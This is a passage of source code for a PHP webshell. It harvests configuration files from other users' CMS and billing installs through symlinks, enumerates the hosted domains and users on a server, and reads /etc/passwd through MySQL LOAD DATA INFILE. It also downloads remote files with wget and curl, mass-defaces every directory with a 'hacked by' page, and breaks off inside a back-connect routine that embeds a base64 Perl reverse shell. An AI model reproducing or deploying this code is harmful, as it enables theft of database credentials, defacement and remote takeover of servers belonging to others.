symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
}
#############################
	if(is_readable("/var/named")){
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
	echo'<tr><td><center><b>SITE</b></center></td><td>
	<center><b>USER</b></center></td>
	<td></center><b>SYMLINK</b></center></td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db")){
	$i += 1;
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

	echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
	<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
	<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
		}
	}
	echo "<center>Total Domains Found: ".$i."</center><br />";
	}else{ 
	echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>"; }

break;

##################################
error_reporting(0);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
if(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

$list = scandir("/var/named");

foreach($etcz as $etz){
$etcc = explode(":",$etz);

foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $etcc[0])
{
$i += 1;
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}}}}
echo "<center>Total Domains Found: ".$i."</center><br />";}

break;
###############################
if(is_readable("/etc/named.conf")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%',$named,$domains);
foreach($domains[1] as $domain){
$domain = trim($domain);
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";

} else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>"; }

break;
############################
if(is_readable("/etc/valiases")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td>
<center><b>USER</b></center></td><td></center>
<b>SYMLINK</b></center></td>';
$list = scandir("/etc/valiases");
foreach($list as $domain){
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";
} else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }

break;
}}
##########################
#JembutLoyality
##########################################
#######################
########################
# JAAAAAAAAAAAAANCCCCCCCCCCCOOOOOOOOOOOOOK
##################
# recode by Kapaljetz666
#########################
#gue kasih skat biar ga pusing :v
##################################
//////////////////
########################################################################
########################################################################
#########################################################################
# END
############## MYSQL ########################################
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport']))
{
$sqlhost = $_GET['sqlhost'];
$sqluser = $_GET['sqluser'];
$sqlpass = $_GET['sqlpass'];
$sqlport = $_GET['sqlport'];
if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass))
{
$msg .= "<div style='width:99%;padding:4px 10px 0 10px;'>";
$msg .= "<p>Connected to ".$sqluser."<span class='gaya'>@</span>".$sqlhost.":".$sqlport;$msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;'>[ databases ]</a>";
if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."'>".htmlspecialchars($_GET['db'])."</a>";
if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."'>".htmlspecialchars($_GET['table'])."</a>";
$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>";$msg .= "</div>";echo $msg;if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){$db = $_GET['db'];$query = "DROP TABLE IF EXISTS b374k_table;\nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE '/etc/passwd'\nINTO TABLE b374k_table;SELECT * FROM b374k_table;\nDROP TABLE IF EXISTS b374k_table;";
$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'><input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>$query</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
$tables = array();
$msg .= "<table class='explore' style='width:99%;'><tr><th>available tables on ".$db."</th></tr>";$hasil = @mysql_list_tables($db,$con);
while(list($table) = @mysql_fetch_row($hasil)){@array_push($tables,$table);} @sort($tables);
foreach($tables as $table){
$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."'>$table</a></td></tr>";} $msg .= "</table>";} 
elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
$db = $_GET['db'];$table = $_GET['table'];$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;";$msgq = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$columns = array();$msg = "<table class='explore' style='width:99%;'>";$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);while(list($column) = @mysql_fetch_row($hasil)){$msg .= "<th>$column</th>";$kolum = $column;}$msg .= "</tr>";$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table);
list($total) = mysql_fetch_row($hasil);
if(isset($_GET['z'])) $page = (int) $_GET['z'];
else $page = 1;$pagenum = 100;$totpage = ceil($total / $pagenum);$start = (($page - 1) * $pagenum);$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum);
while($datas = @mysql_fetch_assoc($hasil)){$msg .= "<tr>";foreach($datas as $data){if(trim($data) == "") 
$data = "&nbsp;";$msg .= "<td>$data</td>";}$msg .= "</tr>";} $msg .= "</table>";$head = "<div style='padding:10px 0 0 6px;'> <form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> Page <select class='inputz' name='z' onchange='this.form.submit();'>";
for($i = 1;$i <= $totpage;$i++){$head .= "<option value='".$i."'>".$i."</option>";
if($i == $_GET['z']) $head .= "<option value='".$i."' selected='selected'>".$i."</option>";} $head .= "</select><noscript><input class='inputzbut' type='submit' value='Go !' /></noscript></form></div>";$msg = $msgq.$head.$msg;} 
elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){$db = $_GET['db'];$query = magicboom($_GET['sqlquery']);
$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";@mysql_select_db($db);$querys = explode(";",$query);foreach($querys as $query){if(trim($query) != ""){$hasil = mysql_query($query);
if($hasil){$msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";$msg .= "<table class='explore' style='width:99%;'><tr>";
for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";$msg .= "</tr>";for($i=0;$i<@mysql_num_rows($hasil);$i++) {$rows=@mysql_fetch_array($hasil);$msg .= "<tr>";for($j=0;$j<@mysql_num_fields($hasil);$j++) {
if($rows[$j] == "") $dataz = "&nbsp;";
else $dataz = $rows[$j];$msg .= "<td>".$dataz."</td>";} $msg .= "</tr>";} $msg .= "</table>";} 
else $msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";} } } 
else {$query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /><input type='hidden' name='x' value='mysql' /><input type='hidden' name='sqlhost' value='".$sqlhost."' /><input type='hidden' name='sqluser' value='".$sqluser."' /><input type='hidden' name='sqlport' value='".$sqlport."' /><input type='hidden' name='sqlpass' value='".$sqlpass."' /><input type='hidden' name='db' value='".$db."' /><p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p><p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p></form></div> ";$dbs = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available databases</th></tr>";$hasil = @mysql_list_dbs($con);
while(list($db) = @mysql_fetch_row($hasil)){@array_push($dbs,$db);} @sort($dbs);foreach($dbs as $db){
$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."'>$db</a></td></tr>";} $msg .= "</table>";} 
@mysql_close($con);} else $msg = "<p style='text-align:center;'>can't connect</p>";echo $msg;} else{?> 
<br><center><div class="mybox"><h2 class="k2ll33d2">MySQL Connect !<br>if you want use mysql interface by S4MP4H, change url '&x=mysq' to '&x=sql'</h2>
<form action="?" method="get"><input type="hidden" name="y" value="<?php echo $pwd;?>" /> 
<input type="hidden" name="x" value="mysql" /><table class="tabnet" style="width:300px;"> <tr>
<th colspan="2">Connection Form</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> 
<tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> 
<tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> 
<tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" />
</td></tr></table></form></div></center>
<?
   }
   }
########################################################################
# 							START UPLOAD					#
elseif(isset($_REQUEST['upload'])){ $s_result = " "; $msg = "";
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$path = magicboom($_POST['path']);
	$namafile = download($pilihan,$wurl);
	$pindah = $path.$namafile;
	if(is_file($pindah)) {
		$msg = "file uploaded to $pindah";
	}
	else $msg = "failed to upload $namafile";

}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:#FFFF00;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from url</th></tr>
<tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }
/////////////////////// END
/////////////////////// START HASH
elseif(isset($_GET['x']) && ($_GET['x'] == 'hash'))
    {
	?>
	<?php
$submit= $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
}
echo '<form action="" method="post"><table class="tabnet">';
echo '<th colspan="2">Password Hash</th></center></tr>';
echo '<td><b>masukan kata yang ingin di encrypt:</b></td>';
echo '<td><input class="inputz" type="text" name="password" size="40" />';
echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
//echo '</td></tr><br>';
echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value='.$pass.'></td></tr>';
echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value='.$hash.'></td></tr>';
echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value='.$md4.'></td></tr>';
echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value='.$hash_md5.'></td></tr>';
echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value='.$hash_md5_double.'></td></tr>';
echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value='.$hash1.'></td></tr>';
echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value='.$sha256.'></td></tr>';
echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value='.$hash1_sha1.'></td></tr>';
echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr></table>'; 
}

///////////// END OF HASH
########################################################################
######################################################
////START HASH ID
elseif(isset($_GET['x']) && ($_GET['x'] == 'hashid')) {
if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	
	?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table class="tabnet">
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
	
	<?php

}
//////////////////// MASS DEFACE START HERE
elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
{
echo "<center/><br/><b><font color=white>Mass Deface (recode by Kapaljetz666)</font></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<br>
<br>
note: if not domain in deface result, that mean this site not work mass deface (permission denied)<br><td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="del.htm"></td>
	</tr>
</tr>
<th colspan='2'><b>Script Deface</b></th><br></table>
<textarea style='background:black;outline:none;color:white;' name='index' rows='10' cols='67'>
<html>
<head>
<title>hacked by Kapaljetz666</title>
<link rel='SHORTCUT ICON' type='image/x-icon' href='http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif'>
<meta name="robots" content="index, follow"> 
<meta name="Description" content="hacked by Kapaljetz666">
<meta name="keyword" content="hacked by Kapaljetz666">
<meta name="googlebot" content="index,follow" /> 
<meta name="robots" content="all" /> 
<meta name="robots schedule" content="auto" /> 
<meta name="distribution" content="global" /> 
<body onload="type_text()" alink="#FFFF00" vlink="#FFFF00" link="#FFFF00" text="#FFFF00">
<table height=90% width=100%>
<script type="text/javascript">

var snowmax=75
var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
var snowletter="*"
var sinkspeed=0.6
var snowmaxsize=22
var snowminsize=8
var snowingzone=1

// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<td align=center>
</head>
<body bgcolor="#000000" text="#FFFF00"><center>
<font face=courier new>
<h1>
<font color='red'>hacked by Kapaljetz666</font><p>
<font size=3>don't worry, and keep your calm<br>
Deface just a game, if you say it's a crime, that mean you're stupid<p>
</font>
<font face='courier new' size=3>
greets for you <a href="http://zone-h.org/archive/notifier=Kapaljetz666" target="_blank">
<img src="http://s10.postimg.org/6cc1ngy7p/Cur.png" name="haha you found me" height=20 width=25></img></a>
</font>
<EMBED ALIGN='CENTER' AUTOSTART='TRUE' HEIGHT='1' LOOP='TRUE' SRC='http://vivat365.com/wp-admin/videoplayback_2.swf' WIDTH='1'></EMBED>
</style>
</body>
</html>
</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>
<h3>defaced result: </h3>
<br><br>
versi text area:<br>
<textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>
<?php 	$ini="http://";
		$mainpath=$_POST[path];
		$file=$_POST[file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[index]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo"$ini$row/$file\n";}}
?>
</textarea><br>
<br><br>versi text:<br><br>
<?php 	$ini="http://";
		$mainpath=$_POST[path];
		$file=$_POST[file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[index]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo"<a href="."$ini$row/$file"." target="."_blank".">$ini$row/$file</a><br>";}}

?>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'sbc')){ @ini_set('output_buffering',0); 
?>
    <form action="?y=<?php echo $pwd; ?>&x=sbc" method="post">
	<br><br><center><b><font size=4>Back Connect Simple</font></b></center><br>
<?php
echo "
<head>
<link rel='icon' type='image/ico' href='http://media.stateofq.com/photologue/photos/cache/facebook%20favicon_thumbnail.png'/>
<form method='POST'>
<title>Facebook Brute Force 2014</title>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
border:1px solid red ;
border-left: 4px solid red ;
}
input {
color: #000000;
border:1px dotted black;
}
</style>";
if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'],"0777")){alert("Directory Created !");}else{alert("Permission Denied !");}}
function bcn($ipbc,$pbc){
$bcperl="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
